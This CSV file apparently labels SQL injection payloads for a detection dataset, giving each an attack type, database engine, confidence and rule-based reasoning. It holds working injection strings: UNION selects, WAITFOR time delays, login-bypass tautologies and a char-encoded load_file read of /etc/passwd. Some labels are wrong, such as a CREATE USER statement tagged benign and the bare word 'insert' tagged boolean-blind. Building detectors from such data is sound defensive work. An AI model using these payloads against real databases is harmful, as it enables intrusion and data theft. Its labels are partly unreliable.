id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
6,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;",out_of_band,mysql,1.0,"Signals: 'load_file', 'char'; DB: mysql. Payload length: 77 chars.",2
38,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",out_of_band,mysql,1.0,"Signals: 'load_file', 'char'; DB: mysql. Payload length: 56 chars.",2
1,create user name identified by pass123 temporary tablespace temp default tablespace users;,benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 90 chars.,2
78,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",union_based,mssql,0.9,Signals: 'sysobjects'; UNION-based payload detected; DB: mssql,2
135,""" ) ;waitfor delay '0:0:__TIME__'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
149,a' waitfor delay '0:0:10'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
171,union select * from users where login = char ...,union_based,mssql,0.9,Signals: 'char'; UNION-based payload detected; DB: mssql,2
3,"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
4,"select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
7,"select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
8,"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
9,? or 1 = 1 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,2
11,admin' or 1 = 1#,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 16 chars.,2
13,or 1 = 1 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,2
15,"select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
24,insert,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 6 chars.,2
29,"or 1 = 1 or """" =",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 16 chars.,2
30,or 1 = 1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 8 chars.,2
32,"select * from users where id = '1' union select ||/1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
33,"select * from users where id = '1' union select +\.,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
34,or 1 = 1/*,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
35,' or 1 = 1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
36,"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
37,"select * from users where id = '1' union select $*$,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
39,"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
41,"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
42,"select * from users where id = 1 union select 1||1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
43,"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 98 chars.,2
51,"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 102 chars.,2
53,"select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
54,or 1 = 1--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
60,"select * from users where id = 1 or 1#"". union select null,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
61,admin' or '1' = '1,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 18 chars.,2
63,"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 91 chars.,2
64,""" or 0 = 0 --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,2
65,"select * from users where id = 1 union select @ $_,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
68,"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
72,"or 0 = 0 #""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,2
75,"select * from users where id = 1.<@$ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
77,"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 97 chars.,2
79,"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
80,"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
